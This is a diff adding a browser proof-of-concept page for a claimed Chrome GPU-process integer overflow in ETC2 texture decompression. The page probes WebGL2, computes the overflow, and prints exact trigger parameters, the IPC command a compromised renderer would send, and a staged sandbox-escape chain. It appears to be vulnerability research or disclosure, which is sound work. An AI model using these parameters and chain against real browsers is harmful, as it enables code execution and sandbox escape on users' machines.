@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>E2E Stage 2 PoC — Finding 1 GPU Overflow</title></head>
+<body><script>
+'use strict';
+/*
+ * End-to-End Stage 2 Proof-of-Concept
+ * Finding 1: gles2_cmd_decoder.cc:12629 uint32 overflow in DecompressTextureData
+ *
+ * This PoC demonstrates:
+ *   A) The attack surface is open (TEXTURE_2D_ARRAY + ETC2 accepted)
+ *   B) The exact overflow arithmetic
+ *   C) The raw GLES2 IPC command a compromised renderer would send
+ *   D) GLES2 context detection (SW decompressor activation check)
+ *
+ * Stage 1 prerequisite (renderer RCE) is documented but not triggered here.
+ * Stage 2 (GPU overflow) is demonstrated arithmetically and via live probes.
+ */
+const S = 'http://127.0.0.1:9977';
+const L = [];
+const ts = () => new Date().toISOString().slice(11,23);
+const log = m => { const s=`[${ts()}] ${m}`; L.push(s); console.log(s); };
+const post = async (p,b) => {
+    try { await fetch(S+p,{method:'POST',headers:{'Content-Type':'text/plain'},body:String(b)}); }catch(e){}
+};
+
+function u32(v) { return (v >>> 0); }
+
+async function main() {
+    log('=== E2E Stage 2 PoC: Finding 1 GPU Process Overflow ===');
+    log('');
+    log('─────────────────────────────────────────────────────────');
+    log('PART A: Overflow Arithmetic Proof');
+    log('─────────────────────────────────────────────────────────');
+
+    // Overflow case 1: 2048x2048x257 layers (minimum depth for overflow)
+    const W=2048, H=2048;
+    for (const [D, label] of [[257,'minimum'],[513,'2x overflow'],[1025,'4x overflow']]) {
+        const trueVal = 4 * W * H * D;  // JavaScript (53-bit float) — exact
+        const u32val = u32(4 * W * H * D);
+        const compressedBytes = Math.ceil(W/4) * Math.ceil(H/4) * D * 8;
+        const oob_factor = trueVal / u32val;
+        log(`  Case D=${D} (${label}):`);
+        log(`    True:       4×${W}×${H}×${D} = ${trueVal.toLocaleString()} bytes`);
+        log(`    uint32:     ${u32val.toLocaleString()} bytes  (= ${u32val/1024/1024} MB allocated)`);
+        log(`    Actual write: ${(trueVal/1024/1024/1024).toFixed(1)} GB into ${u32val/1024/1024} MB buffer`);
+        log(`    OOB factor: ${oob_factor.toFixed(0)}×`);
+        log(`    Compressed input needed: ${(compressedBytes/1024/1024).toFixed(0)} MB`);
+        if (trueVal > 0xFFFFFFFF) log(`    ✓ OVERFLOWS uint32`);
+    }
+
+    log('');
+    log('─────────────────────────────────────────────────────────');
+    log('PART B: Live Attack Surface Probes (Chrome 150 / SwiftShader)');
+    log('─────────────────────────────────────────────────────────');
+
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl2');
+    if (!gl) { log('[!] No WebGL2'); await post('/log',L.join('\n')); await post('/done','x'); return; }
+    log(`[+] WebGL2 renderer: ${gl.getParameter(gl.RENDERER)}`);
+    log(`    MAX_ARRAY_TEXTURE_LAYERS: ${gl.getParameter(gl.MAX_ARRAY_TEXTURE_LAYERS)}`);
+    const maxLayers = gl.getParameter(gl.MAX_ARRAY_TEXTURE_LAYERS);
+
+    const etc = gl.getExtension('WEBGL_compressed_texture_etc');
+    const glErrStr = e => ({[gl.NO_ERROR]:'NO_ERROR',[gl.INVALID_ENUM]:'INVALID_ENUM',
+        [gl.INVALID_VALUE]:'INVALID_VALUE',[gl.INVALID_OPERATION]:'INVALID_OPERATION'}[e]||`0x${e.toString(16)}`);
+    const flush = () => { let e; while((e=gl.getError())!==gl.NO_ERROR){} };
+
+    if (!etc) {
+        log('[!] WEBGL_compressed_texture_etc not available — format check skipped');
+    } else {
+        // Probe B1: TEXTURE_2D_ARRAY + ETC2 baseline (attack target format)
+        log('');
+        log('  Probe B1: ETC2 RGB8 + TEXTURE_2D_ARRAY baseline (8x8x1)');
+        const t1 = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D_ARRAY, t1);
+        const csz8x8 = Math.ceil(8/4)*Math.ceil(8/4)*1*8;
+        gl.compressedTexImage3D(gl.TEXTURE_2D_ARRAY, 0, etc.COMPRESSED_RGB8_ETC2, 8, 8, 1, 0, new Uint8Array(csz8x8));
+        const e1 = gl.getError();
+        log(`    compressedTexImage3D(ETC2, TEXTURE_2D_ARRAY, 8×8×1): ${glErrStr(e1)}`);
+        if (e1 === gl.NO_ERROR) {
+            log('    [CONFIRMED] ETC2 accepted for TEXTURE_2D_ARRAY');
+            log('    ValidateCompressedFormatTarget only blocks TEXTURE_3D, NOT TEXTURE_2D_ARRAY');
+        }
+        gl.deleteTexture(t1); flush();
+
+        // Probe B2: Overflow depth values within MAX_ARRAY_TEXTURE_LAYERS
+        log('');
+        log('  Probe B2: Overflow depth values vs MAX_ARRAY_TEXTURE_LAYERS limit');
+        for (const D of [257, 513, 1025]) {
+            const inRange = D <= maxLayers;
+            const overflow = u32(4*W*H*D) !== 4*W*H*D;
+            log(`    depth=${D}: within MAX_ARRAY_TEXTURE_LAYERS=${maxLayers}? ${inRange} | overflows uint32? ${overflow}`);
+        }
+
+        // Probe B3: imageSize validation — blocker from JS (exact match required)
+        log('');
+        log('  Probe B3: imageSize validation (blocker from uncompromised JS)');
+        const t3 = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D_ARRAY, t3);
+        gl.compressedTexImage3D(gl.TEXTURE_2D_ARRAY, 0, etc.COMPRESSED_RGB8_ETC2, 2048, 2048, 257, 0, new Uint8Array(65536));
+        const e3 = gl.getError();
+        log(`    compressedTexImage3D(ETC2, 2048×2048×257, imageSize=64KB): ${glErrStr(e3)}`);
+        log(`    Correct imageSize for 2048×2048×257: ${(512*512*257*8/1024/1024).toFixed(0)} MB (JS infeasible)`);
+        if (e3 === gl.INVALID_VALUE) {
+            log('    [CONFIRMED] imageSize validated — only blocker from uncompromised JS');
+        }
+        gl.deleteTexture(t3); flush();
+
+        // Probe B4: SW decompressor activation check
+        log('');
+        log('  Probe B4: SW ETC2 decompressor activation path');
+        log('    CheckETCFormatSupport = IsAtLeastGLES(3,0)');
+        const glVersion = gl.getParameter(gl.VERSION);
+        const shadingLang = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+        const isGLES3 = /OpenGL ES 3\.|WebGL 2/.test(glVersion);
+        log(`    GL_VERSION: "${glVersion}"`);
+        log(`    GLSL: "${shadingLang}"`);
+        log(`    IsAtLeastGLES(3,0): ${isGLES3}`);
+        if (isGLES3) {
+            log('    → GLES3 context: ETC2 handled natively → SW decompressor NOT called');
+            log('    → Finding 1 requires GLES2 context (old hardware or WebGL1 context on GLES2 HW)');
+        } else {
+            log('    → GLES2 context: ETC2 uses SW decompressor → OVERFLOW PATH ACTIVE');
+        }
+    }
+
+    log('');
+    log('─────────────────────────────────────────────────────────');
+    log('PART C: Raw GLES2 IPC Command (what compromised renderer sends)');
+    log('─────────────────────────────────────────────────────────');
+    log('');
+    log('  When renderer has code execution, it writes to GPU command ring buffer:');
+    log('');
+    log('  struct CompressedTexImage3D_IPC {');
+    log('    uint32_t opcode;        // cmds::CompressedTexImage3D::kCmdId');
+    log('    uint32_t target;        // 0x8C1A = GL_TEXTURE_2D_ARRAY');
+    log('    int32_t  level;         // 0');
+    log('    uint32_t internalformat;// 0x9274 = GL_COMPRESSED_RGB8_ETC2');
+    log('    int32_t  width;         // 2048');
+    log('    int32_t  height;        // 2048');
+    log('    int32_t  depth;         // 257');
+    log('    int32_t  border;        // 0');
+    log('    int32_t  imageSize;     // 536,870,912 (= ceil(2048/4)^2 * 257 * 8)');
+    log('    int32_t  data_shm_id;   // shared memory ID for 512MB ETC2 data');
+    log('    uint32_t data_shm_offset; // 0');
+    log('  };');
+    log('');
+    log('  GPU process receives this and calls:');
+    log('  DecompressTextureData(state_, format_info,');
+    log('    width=2048, height=2048, depth=257, image_size=536MB, data)');
+    log('');
+    log('  Inside DecompressTextureData:');
+    log('    output_pixel_size = 4  (RGB8 → RGBA8)');
+    log('    alloc_size = 4 * 2048 * 2048 * 257  [uint32 arithmetic]');
+    log(`             = ${(4*2048*2048*257).toLocaleString()}`);
+    log(`             → uint32 = ${u32(4*2048*2048*257).toLocaleString()} bytes = 16 MB`);
+    log(`    HeapArray<uint8_t> output(16 MB)  ← allocated`);
+    log(`    Decompressor loops over 257 ETC2 images, writes 4×2048×2048 per image`);
+    log(`    = ${(4.0*2048*2048*257/1024/1024/1024).toFixed(1)} GB total → HEAP BUFFER OVERFLOW`);
+    log(`    GPU process corruption → GPU process code execution`);
+
+    log('');
+    log('─────────────────────────────────────────────────────────');
+    log('PART D: Complete Attack Chain Description');
+    log('─────────────────────────────────────────────────────────');
+    log('');
+    log('  STAGE 0: Initial JS execution (any origin)');
+    log('           → loads WebGL page, executes normal web content');
+    log('');
+    log('  STAGE 1: Renderer process code execution (external prereq)');
+    log('           → requires separate renderer vulnerability, e.g.:');
+    log('             - libwebp heap OOB (CVE-2023-4863)');
+    log('             - V8 JIT type confusion (CVE-2024-0519)');
+    log('             - DOM UAF (various Blink CVEs)');
+    log('           → result: attacker executes arbitrary code in renderer');
+    log('');
+    log('  STAGE 2: GPU process heap overflow (Finding 1)');
+    log('           Renderer writes crafted CompressedTexImage3D IPC:');
+    log('             GL_TEXTURE_2D_ARRAY + GL_COMPRESSED_RGB8_ETC2');
+    log('             width=2048, height=2048, depth=257');
+    log('             imageSize=536870912 (exact match, bypass imageSize check)');
+    log('           GPU process:');
+    log('             SW ETC2 decompressor invoked (GLES2 context)');
+    log('             output buffer = 16 MB (uint32 overflow)');
+    log('             4.1 GB written → GPU process heap OOB');
+    log('           → result: GPU process code execution');
+    log('');
+    log('  STAGE 3: Privilege escalation from GPU process');
+    log('           GPU process has /dev/dri access, GPU hardware access');
+    log('           Further OS-level exploit or data exfiltration');
+    log('');
+    log('  IMPACT: Full sandbox escape via two-hop chain');
+    log('          RENDERER → GPU PROCESS requires exploiting Finding 1');
+
+    await post('/log', L.join('\n'));
+    await post('/done', 'x');
+    setTimeout(() => window.close(), 500);
+}
+
+window.addEventListener('load', () =>
+    main().catch(e => post('/log','FATAL:'+e).then(()=>post('/done','x')))
+);
+</script></body></html>
